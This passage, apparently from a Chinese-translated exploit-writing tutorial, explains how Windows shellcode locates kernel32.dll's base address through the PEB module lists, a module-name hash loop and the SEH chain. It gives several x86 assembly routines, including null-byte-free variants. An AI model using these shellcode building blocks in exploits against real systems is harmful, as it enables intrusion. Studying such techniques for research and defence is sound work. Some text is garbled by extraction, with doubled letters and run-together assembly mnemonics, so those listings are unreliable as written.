shellcode。同时，很明显小的，没有地址硬编码的shellcode需要更多的工作。
无论如何，我们要怎样自己加载user32.dll并且克服地址硬编码？
介绍：系统调用和 kkkkeeeerrrrnnnneeeellll33332222....ddddllllllll
当你想让一个exploit执行一些有用的代码，你会发现你必须和windows内核打交道。你
需要用所谓的“系统调用”当你想执行某些OS特殊任务。
很不幸，windowsOS没有真正提供一种方法，一个接口，一个API来直接和内核打交道，
并且能够用简单的方式来做有用的事。这就意味着你将要用OSdll（作为回报，跟内核打交
道）上的其他一些可用的API来使你的shellcode做你想做的事。
甚至是最基本的操作，像弹出一个消息对话框（我们的例子中）需要这个API：user32.dll
中的MessageBoxAAPI。同样的原因适用于ExitProcessAPI（kernel32.dll），ExitThread（）
等等。
为了用这些API，user32.dll和kernel32.dll需要被加载并且我们不得不找到函数的地址。
接下来，我们不得不在我们的exploit代码中将它们硬编码来使它工作。它工作在我们的系
统上，但是我们对user32.dll和kernel32.dll比较幸运（因为在我们运行代码时他们看起来已
经被映射了）。我们也必须意识到这个API的地址在不同windows版本上是不同的。因此我
们的exploit对XPSP3有效。
我们要怎样使它更动态？好的，我们需要找到保存这些API的dll的基地址，我们必须
在dll里找到API的地址。
DLL是“动态链接库”的简称。词“动态”指示了这些dll是在运行时动态加载到进程
空间中的。幸运地，user32.dll是很常用的dll并且在很多应用程序中加载，但是我们不能依
赖这个。
唯一的一个或多或少可以保证加载进进程空间的是kernel32.dll。关于kernel32.dll的很好
的事实是它提供了一对API，能够允许你加载其他的dll，或者动态获取函数的地址：
LoadLibraryA（参数：指向一个模块要加载的字符串，当它加载成功时，返回一个指
向基址的指针）
GetProcAddress
这是好消息。所以我们能用这些kernel32API来加载其他dll，并且找到API，然后用这
些API来执行某些任务（如建立网络套接字，绑定commandshell，等等）
就这样，但是有另一个问题出来了：在不同版本的windows中kernel32.dll是不会加载在
相同的基地址。所以我们必须找到一种动态获取kernel32.dll基地址的方法，它能够允许我
们基于找到的基地址做其他的事（GetProcAddress，LoadLibrary，运行其他的API。
找到kkkkeeeerrrrnnnneeeellll33332222....ddddllllllll
Skape’sexcellentpaper解释了三种找这个的技术：
PEB
这是找kernel32.dll基地址的最可靠的技术，并且对从95到Vista的Win32操作系统都有
效。Skape的文章里讲到的技术在window7中已经无效了，但是我们将会看下怎么解决这个
问题（还是用在PEB中找到的信息）
这种技术后面的思想是基于在PEB（进程环境块--一个OS分配的结构，包含了进程的信
息）映射的模块中，kernel32.dll通常是在InInitializationOrderModuleList中的第二个(除了
windows7--看后面）。
在进程中，PEB位于fs:[0x30]。
找kernel32.dll基地址的基本asm代码是这样的：
（大小：37字节，null字节：有）
find_kernel32:
pushesi
xoreax,eax
moveax,[fs:eax+0x30]
testeax,eax
jsfind_kernel32_9x
find_kernel32_nt:
moveax,[eax+0x0c]
movesi,[eax+0x1c]
lodsd
moveax,[eax+0x8]
jmpfind_kernel32_finished
find_kernel32_9x:
moveax,[eax+0x34]
leaeax,[eax+0x7c]
moveax,[eax+0x3c]
find_kernel32_finished:
popesi
ret
在函数的结尾，kernel32.dll的基地址将会被放在eax中。（如果你正在用这个内联代码--
不是从一个函数，你可以不用最后的ret指令）
当然，如果你不想把Win95/98作为目标（举个例子，因为你尝试exploit的目标程序不
能用在Win95/98），那么你可以把代码完善/简化一点：
（大小：19字节，null字节：无）
find_kernel32:
pushesi
xoreax,eax
moveax,[fs:eax+0x30]
moveax,[eax+0x0c]
movesi,[eax+0x1c]
lodsd
moveax,[eax+0x8]
popesi
ret
（你可以不用最后一条ret指令如果你将代码内联）
注意：做一些小改动，你能使它是没有null字节：
find_kernel32:
pushesi
xorebx,ebx ;clearebx
mov bl,0x30 ; needed to avoid null
bytes ;whengettingpointertoPEB
xoreax,eax ;cleareax
moveax,[fs:ebx] ;getapointertothePEB,nonullbytes
moveax,[eax+0x0C] ;getPEB->Ldr
movesi,[eax+0x1c]
lodsd
moveax,[eax+0x8]
popesi
ret
在window7中，kernel32.dll不是列在第二个，而是第三个。当然，你可以只改变代码并且
找到第三个入口，但是这会使这个技术对其他（不是windows7）版本的windows操作系统
无效。
很幸运，有两种可行的方法来使PEB技术能够对所有的windows版本（从windows2000到
windows7）都有效：
方案一：从harmonysecurity.com得到的代码：
（大小：22字节，null字节：有）
xorebx,ebx ;clearebx
movebx,[fs:0x30] ;getapointertothePEB
movebx,[ebx+0x0C] ;getPEB->Ldr
movebx,[ebx+0x14] ;getPEB->Ldr.InMemoryOrderModuleList.Flink(1stentry)
movebx,[ebx] ;getthenextentry(2ndentry)
movebx,[ebx] ;getthenextentry(3rdentry)
movebx,[ebx+0x10] ;getthe3rdentriesbaseaddress(kernel32.dll)
这个代码利用了kernel32.dll是在InMemoryOrderModuleList中的第三个的事实。（因此它是
一个和前面代码稍微不同的方法，前面是查找InitializationOrder表，但是它还是用能在PEB
中能够用的信息）。在这个示例代码中，基地址写入到ebx中。当需要时可以用一个不同的
寄存器。同时，记住：这个代码包含3个null字节。
没有null字节，并且用eax来存储kernel32的基地址，这个代码会稍微变大，看起来是这样
的：
[BITS32]
pushesi
xoreax,eax ;cleareax
xorebx,ebx ;clearebx
movbl,0x30 ;setebxto0x30
moveax,[fs:ebx] ;getapointertothePEB(nonullbytes)
moveax,[eax+0x0C] ;getPEB->Ldr
moveax,[eax+0x14] ;getPEB->Ldr.InMemoryOrderModuleList.Flink(1stentry)
pusheax
popesi
moveax,[esi] ;getthenextentry(2ndentry)
pusheax
popesi moveax,[esi] ;getthenextentry(3rdentry)
moveax,[eax+0x10] ;getthe3rdentriesbaseaddress(kernel32.dll)
popesi
正如harmonysecurity.com上所陈述的--这个代码不能100%在windows2000电脑上有效...下
面的代码将会使它更可靠（必要的话！我不用这个代码）
（大小：50字节，null字节：无）
cld ;clearthedirectionflagfortheloop
xoredx,edx ;zeroedx
movedx,[fs:edx+0x30];getapointertothePEB
movedx,[edx+0x0C] ;getPEB->Ldr
movedx,[edx+0x14] ;getthefirstmodulefromthe
;InMemoryOrdermodulelist
;foreachmodule(untilkernel32.dllisfound),loop:
next_mod:
movesi,[edx+0x28] ;getpointertomodulesname(unicodestring)
pushbyte24 ;pushdownthelengthwewanttocheck
popecx ;setecxtothislengthfortheloop
xoredi,edi ;clearediwhichwillstorethehashofthemodulename
loop_modname:
xoreax,eax ;cleareax
lodsb ;readinthenextbyteofthename
cmpal,'a' ;someversionsofWindowsuselowercasemodulenames
jlnot_lowercase
subal,0x20 ;ifsonormalisetouppercase
not_lowercase:
roredi,13 ;rotaterightourhashvalue
addedi,eax ;addthenextbyteofthenametothehash
looploop_modname ;loopuntilwehavereadenough
cmpedi,0x6A4ABC5B;comparethehashwiththatofKERNEL32.DLL
movebx,[edx+0x10];getthismodulesbaseaddress
movedx,[edx] ;getthenextmodule
jnenext_mod ;ifitdoesn'tmatch,processthenextmodule
在这个例子中，kernel32.dll的基地址放在ebx中。
方案2：skylined技术（看这里here）。
这技术还是查看InInitialOrderModuleList，并且检查模块名的长度。Kernel32.dll的unicode
名的第十二个字符是结束符0。因此在名字中扫描第24个字节将允许你正确找到
kernel32.dll。这种方案是通用的，会在各个版本的windowsOS上有效，并且是没有null字
节的。
（大小：25字节，null字节：无）
[BITS32]
XOR ECX,ECX ;ECX=0
MOV ESI,[FS:ECX+0x30];ESI=&(PEB)([FS:0x30])
MOV ESI,[ESI+0x0C] ;ESI=PEB->Ldr
MOV ESI,[ESI+0x1C] ;ESI=PEB->Ldr.InInitOrder next_module:
MOV EBP,[ESI+0x08] ;EBP=InInitOrder[X].base_address
MOV EDI,[ESI+0x20] ;EBP=InInitOrder[X].module_name(unicode)
MOV ESI,[ESI] ;ESI=InInitOrder[X].flink(nextmodule)
CMP [EDI+12*2],CL ;modulename[12]==0?
JNE next_module ;No:trynextmodule.
这个代码将会把kernel32的基地址放入EBP
SSSSEEEEHHHH
这个技术是基于大多数情况下的事实，最后一个异常处理函数（0xffffffff）指向kernel32.dll...
所以在查找可让kernel32里面的指针后，我们所要做的是往回循环到内核的顶部，并且比较
前两个字节。（不用说，如果最后一个异常处理函数没有指向kernel32.dll，这个技术明显会
失败）
（大小：29字节，null字节：无）
find_kernel32:
pushesi ;Saveesi
pushecx ;Saveecx
xor ecx,ecx ;Zeroecx
mov esi,[fs:ecx] ;SnagourSEHentry
find_kernel32_seh_loop:
lodsd ;Loadthememoryinesiintoeax
xchgesi,eax ;Usethiseaxasournextpointerforesi
cmp [esi],ecx ;Isthenext-handlersetto0xffffffff?
jns find_kernel32_seh_loop ;Nope,keepgoing. Otherwise,fallthrough.
find_kernel32_seh_loop_done:
lodsd
lodsd ;Loadtheaddressofthehandlerintoeax
find_kernel32_base:
find_kernel32_base_loop:
dec eax ;Subtracttoournextpage